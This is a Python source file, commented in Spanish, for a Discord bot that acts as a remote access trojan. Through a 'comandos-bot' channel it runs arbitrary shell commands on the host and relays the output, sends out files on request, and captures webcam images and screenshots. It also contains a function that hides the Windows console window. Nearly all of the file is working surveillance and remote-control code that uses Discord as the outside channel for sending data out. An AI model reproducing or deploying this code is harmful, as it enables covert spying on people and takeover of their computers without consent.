import os # -> Manejar el Sistema Operativo (Lo utilizamos para cambiar de directorio)
import discord # -> Libreria principal para interactuar con la API de Discord
import subprocess # -> Permite ejecutar comandos del sistema operativo y capturar su salida
import cv2 # -> Libreria para Captura de Camara
import pyautogui # -> Libreria para capturar la pantalla
import ctypes
import sys
from discord.ext import commands # -> Extensión de discord.py para crear comandos


TOKEN = "TOKEN_CODE"

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)
current_directory = os.getcwd()

def hide_console():
    if os.name == "nt":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

@bot.event
async def on_ready():
    guild = bot.guilds[0]
    channel = discord.utils.get(guild.text_channels, name="comandos-bot")
    if channel:
        print(f'Bot conectado como {bot.user}')
        await channel.send("Bot conectado y listo para recibir comandos.")
    else:
        print("No se encontró el canal 'comandos-bot'.")
 
# E V E N T O S <--------------------------------------------------------------

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if message.channel.name == "comandos-bot":
        await bot.process_commands(message)
    else:
        if message.content.startswith("!"):
            await message.channel.send("Por favor, usa el canal `comandos-bot` para los comandos.")

@bot.event
async def on_guild_join(guild):
    existing_channel = discord.utils.get(guild.text_channels, name="comandos-bot")
    if not existing_channel:
        try:
            await guild.create_text_channel("comandos-bot")
            print(f"Canal 'comandos-bot' creado en el servidor: {guild.name}")
        except discord.Forbidden:
            print(f"No se pudo crear el canal 'comandos-bot' en {guild.name}. Verifica los permisos.")
        except Exception as e:
            print(f"Error al crear el canal en {guild.name}: {e}")
            
# C O M A N D O S <--------------------------------------------------------------
            
@bot.command()
async def cd(ctx, *, path):
    global current_directory
    try:
        new_directory = os.path.abspath(os.path.join(current_directory, path))
        os.chdir(new_directory)
        current_directory = os.getcwd()
        await ctx.send(f"Directorio cambiado a: `{current_directory}`")
    except FileNotFoundError:
        await ctx.send("El directorio especificado no existe.")
    except Exception as e:
        await ctx.send(f"Ocurrió un error: `{str(e)}`")

@bot.command()
async def cmd(ctx, *, command=None):
    global current_directory
    if not command:
        await ctx.send("Por favor, especifica un comando para ejecutar. Ejemplo: `!cmd dir`")
        return

    try:
        output = subprocess.check_output(command, cwd=current_directory, shell=True, stderr=subprocess.STDOUT, text=True)

        if len(output) > 2000:
            for i in range(0, len(output), 2000):
                await ctx.send(f"```\n{output[i:i+2000]}\n```")
        else:
            await ctx.send(f"```\n{output}\n```")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Error al ejecutar el comando:\n```\n{e.output}\n```")
    except Exception as e:
        await ctx.send(f"Ocurrió un error:\n```\n{str(e)}\n```")
        
# C O M A N D O S - D E S C A R G A R  A R C H I V O  <--------------------------------------------------------------
@bot.command()
async def dowload(ctx,* , filename):
    global current_directory
    file_path = os.path.join(current_directory, filename)
    if os.path.exists(file_path) and os.path.isfile(file_path):
        try:
            await ctx.send("Aquí esta el archivo solicitado: ", file=discord.File(file_path))
        except Exception as e:
            await ctx.send(f"Ocurrió un error al enviar el archivo: `{str(e)}`")
    else:
        await ctx.send("El archivo especificado no existe o no es un archivo válido...")

# C O M A N D O S - c A P T U R A  D E  L A  C A M A R A <--------------------------------------------------------------
@bot.command()
async def capture(ctx):
    try:
        cam = cv2.VideoCapture(0)
        ret,frame = cam.read()
        cam.release()
        
        if not ret:
            await ctx.send("No se pudo capturar la imagen.")
            return
        
        # Guardar la imagen
        image_path = "capture.jpg"
        cv2.imwrite(image_path, frame)
        
        await ctx.send("Aquí tienes la imagen capturada:", file=discord.File(image_path))
        
        os.remove(image_path)
    except Exception as e:
        await ctx.send(f"Ocurrió un error al capturar la imagen: `{str(e)}`")
        
        
# C O M A N D O S - C A P T U R A  D E  L A  P A N T A L L A <--------------------------------------------------------------

@bot.command()
async def screenshot(ctx):
    try:
        screenshot_path = "screenshot.png"
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)
        
        await ctx.send("Aquí tienes la captura de pantalla:", file=discord.File(screenshot_path))
        
        os.remove(screenshot_path)
    except Exception as e:
        await ctx.send(f"Ocurrió un error al capturar la pantalla: `{str(e)}`")

# E J E C U C I Ó N <------------------------------------------------------------
bot.run(TOKEN)
